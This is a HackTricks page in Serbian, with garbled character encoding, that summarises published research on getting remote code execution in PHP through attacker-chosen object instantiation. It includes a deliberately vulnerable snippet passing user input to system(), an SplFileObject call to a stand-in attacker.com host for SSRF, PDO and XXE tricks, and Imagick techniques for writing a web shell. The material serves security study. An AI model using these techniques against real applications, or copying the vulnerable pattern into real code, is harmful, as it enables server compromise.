# PHP - RCE zloupotreba kreiranja objekata: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

Ovo je u suÅ¡tini saÅ¾etak [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Uvod

Kreiranje novih proizvoljnih objekata, kao Å¡to je `new $_GET["a"]($_GET["a"])`, moÅ¾e dovesti do Remote Code Execution (RCE), kako je detaljno opisano u [**writeup-u**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Ovaj dokument istiÄe razliÄite strategije za postizanje RCE.

## RCE putem prilagoÄ‘enih klasa ili automatskog uÄitavanja

Sintaksa `new $a($b)` se koristi za instanciranje objekta gde **`$a`** predstavlja ime klase, a **`$b`** je prvi argument prosleÄ‘en konstruktoru. Ove promenljive mogu biti dobijene iz korisniÄkih unosa kao Å¡to su GET/POST, gde mogu biti stringovi ili nizovi, ili iz JSON-a, gde se mogu pojaviti kao druge vrste. 

Razmotrite kod ispod:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
U ovom sluÄaju, postavljanje `$a` na `App` ili `App2` i `$b` na sistemsku komandu (npr., `uname -a`) rezultira izvrÅ¡avanjem te komande.

**Autoloading funkcije** mogu biti iskoriÅ¡Ä‡ene ako takve klase nisu direktno dostupne. Ove funkcije automatski uÄitavaju klase iz fajlova kada su potrebne i definiÅ¡u se koristeÄ‡i `spl_autoload_register` ili `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
PonaÅ¡anje automatskog uÄitavanja varira sa verzijama PHP-a, nudeÄ‡i razliÄite RCE moguÄ‡nosti.

## RCE putem ugraÄ‘enih klasa

U nedostatku prilagoÄ‘enih klasa ili automatskih uÄitavaÄa, **ugraÄ‘ene PHP klase** mogu biti dovoljne za RCE. Broj ovih klasa kreÄ‡e se izmeÄ‘u 100 i 200, u zavisnosti od verzije PHP-a i ekstenzija. Mogu se nabrojati koristeÄ‡i `get_declared_classes()`.

Konstruktori od interesa mogu se identifikovati putem refleksije API-ja, kao Å¡to je prikazano u sledeÄ‡em primeru i linku [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE putem specifiÄnih metoda ukljuÄuje:**

### **SSRF + Phar deserializacija**

Klasa `SplFileObject` omoguÄ‡ava SSRF kroz svoj konstruktor, omoguÄ‡avajuÄ‡i veze sa bilo kojim URL-om:
```php
new SplFileObject('http://attacker.com/');
```
SSRF moÅ¾e dovesti do napada deserializacije u verzijama PHP-a pre 8.0 koristeÄ‡i Phar protokol.

### **IskoriÅ¡Ä‡avanje PDO-a**

Konstruktor klase PDO omoguÄ‡ava povezivanje sa bazama podataka putem DSN stringova, potencijalno omoguÄ‡avajuÄ‡i kreiranje fajlova ili druge interakcije:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Verzije PHP-a do 5.3.22 i 5.4.12 bile su podloÅ¾ne XXE napadima putem `SoapClient` i `SimpleXMLElement` konstruktora, u zavisnosti od verzije libxml2.

## RCE putem Imagick ekstenzije

U analizi **zavisnosti projekta**, otkriveno je da se **Imagick** moÅ¾e iskoristiti za **izvrÅ¡avanje komandi** instanciranjem novih objekata. Ovo predstavlja priliku za iskoriÅ¡Ä‡avanje ranjivosti.

### VID parser

Identifikovana je sposobnost VID parsera da piÅ¡e sadrÅ¾aj na bilo koju odreÄ‘enu putanju u datoteÄnom sistemu. To moÅ¾e dovesti do postavljanja PHP shelle u direktorijum koji je dostupan putem veba, ostvarujuÄ‡i Remote Code Execution (RCE).

#### VID Parser + Upload fajlova

Napomenuto je da PHP privremeno skladiÅ¡ti otpremljene fajlove u `/tmp/phpXXXXXX`. VID parser u Imagick-u, koristeÄ‡i **msl** protokol, moÅ¾e obraditi dÅ¾oker znakove u putanjama fajlova, olakÅ¡avajuÄ‡i prenos privremenog fajla na odabrano mesto. Ova metoda nudi dodatni pristup za postizanje proizvoljnog pisanja fajlova unutar datoteÄnog sistema.

### PHP Crash + Brute Force

Metoda opisana u [**originalnom izveÅ¡taju**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) ukljuÄuje otpremanje fajlova koji izazivaju pad servera pre brisanja. Primenom brute force-a na ime privremenog fajla, postaje moguÄ‡e da Imagick izvrÅ¡i proizvoljan PHP kod. MeÄ‘utim, ova tehnika se pokazala efikasnom samo u zastareloj verziji ImageMagick-a.

## Reference

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
